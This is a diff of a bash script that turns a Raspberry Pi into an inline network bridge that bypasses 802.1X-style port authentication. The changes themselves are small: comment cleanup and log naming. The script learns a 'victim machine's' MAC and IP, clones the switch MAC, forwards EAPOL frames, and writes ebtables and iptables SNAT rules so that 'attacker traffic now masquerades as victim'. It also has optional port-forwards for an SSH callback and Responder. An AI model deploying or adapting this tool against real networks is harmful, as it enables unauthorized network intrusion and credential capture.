@@ -1,10 +1,6 @@
 #!/bin/bash
 
-###############################################################################
-#  Logging + strict-mode prologue  – paste this block once at top of script  #
-###############################################################################
-
-LOG_BASENAME="$(basename "$0" .sh)_$(date +%F_%H-%M-%S).log"
+LOG_BASENAME="$(basename "$0" .sh).log"
 LOG_FILE="$(pwd)/${LOG_BASENAME}"       # log file lives where you invoked script
 
 # send *everything* (stdout & stderr) through tee -> log file
@@ -70,9 +66,6 @@ PORT_SSH=50022               # internal SSHd listening port on the Pi
 RANGE=61000-64000            # high-port SNAT range for outbound TCP/UDP
 #===================================================================================================
 
-## -----------------------------------------------------------------
-##   1. Functions – usage, version and CLI parsing helpers
-## -----------------------------------------------------------------
 
 Usage() {                    # Show help and exit
   echo -e "$0 v$VERSION usage:"
@@ -90,9 +83,6 @@ Usage() {                    # Show help and exit
 }
 #===================================================================================================
 
-## -----------------------------------------------------------------
-##   2. Functions – Checking parameters and setting defaults
-## -----------------------------------------------------------------
 CheckParams() {
   while getopts ":1:2:acg:hirRS" opts; do
     case "$opts" in
@@ -112,9 +102,7 @@ CheckParams() {
 }
 #===================================================================================================
 
-## -----------------------------------------------------------------
-##   3. Functions – Learning the MAC and IP of the victim machine and the switch
-## -----------------------------------------------------------------
+
 Learn(){
 
     # assume any pcap >24 bytes has at least one packet
@@ -131,6 +119,7 @@ Learn(){
     else
     log "SYN file is empty."
     log "Cannot learn MAC and IP of the victim machine. Resetting and trying again."
+    ifconfig $COMPINT down
     Reset;
     exit 1
     fi
@@ -203,13 +192,10 @@ InitialSetup() {
     log "Created bridge $BRINT, added $COMPINT ↔ $SWINT, MAC=$SWMAC"
 
     echo 8 > /sys/class/net/br0/bridge/group_fwd_mask   # forward EAPOL frames
- 
+
     # Bring both physical NICs up with 0.0.0.0 (no IP) + promiscuous
     ifconfig $COMPINT 0.0.0.0 up promisc
     ifconfig $SWINT  0.0.0.0 up promisc
-
-   # Give br0 a harmless fake MAC, then copy SWMAC -> br0
-   # macchanger -m 00:12:34:56:78:90 $BRINT  # placeholder
     
     macchanger -m $SWMAC $BRINT > /dev/null 2>&1          # now identical to switch-side MAC
     ifconfig $BRINT 0.0.0.0 up promisc      # bring the bridge up (still dark)
@@ -273,9 +259,6 @@ ConnectionSetup() {
 
     ifconfig $BRINT $BRIP up promisc            # assign link-local addr to br0
 
-    #------------------------------------------------------------------
-    # 3.3  Layer-2 SNAT – rewrite Pi’s frames → victim’s MAC
-    # -----------------------------------------------------------------
     if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
         SWMAC=$(ifconfig $SWINT | grep -i ether | awk '{ print $2 }')   # (safety)
     fi
@@ -284,16 +267,11 @@ ConnectionSetup() {
 
     log "Inserted ebtables & iptables SNAT / DNAT rules"
 
-
-    # -----------------------------------------------------------------
-    # 3.4  Static route: any packet to 169.254.66.1 (fake GW) goes to GWMAC
-    # -----------------------------------------------------------------
     arp -s -i $BRINT $BRGW $GWMAC                     # static ARP entry
     route add default gw $BRGW dev $BRINT metric 10   # default route via fake GW
 
-    # -----------------------------------------------------------------
-    # 3.5  Optional port-forward rules (SSH callback / Responder)
-    # -----------------------------------------------------------------
+    # Optional port-forward rules (SSH callback / Responder)
+
     if [ "$OPTION_SSH" -eq 1 ]; then
         $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT_SSH \
                       -j DNAT --to $BRIP:$PORT_SSH
@@ -324,9 +302,7 @@ ConnectionSetup() {
         log "Inserted Responder port-forward rules "
     fi
 
-    # -----------------------------------------------------------------
-    # 3.6  Layer-3 SNAT – rewrite Pi’s IP packets → victimIP
-    # -----------------------------------------------------------------
+    # Layer-3 SNAT – rewrite Pi’s IP packets → victimIP
     $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp  -j SNAT --to $COMIP:$RANGE
     $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp  -j SNAT --to $COMIP:$RANGE
     $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP
@@ -344,12 +320,10 @@ ConnectionSetup() {
     rm $TEMP_FILE_SYN                 # delete the 1-packet pcap
     
     log "Bridge fully armed – attacker traffic now masquerades as victim"
-
 }
+#===================================================================================================
 
-## -----------------------------------------------------------------
-##   4. Reset – remove bridge and flush rules
-## -----------------------------------------------------------------
+#4. Reset – remove bridge and flush rules
 Reset() {
 
     # Bring bridge down and delete it
@@ -374,10 +348,10 @@ Reset() {
 
     log "Bridge $BRINT deleted, all rules flushed, sysctl restored !"
 }
+#===================================================================================================
 
-## -----------------------------------------------------------------
-##   5. Main dispatcher – which path to run?
-## -----------------------------------------------------------------
+# Main dispatcher – which path to run?
+
 CheckParams "$@"    # parse CLI options first
 
 if [ "$OPTION_RESET" -eq 1 ]; then
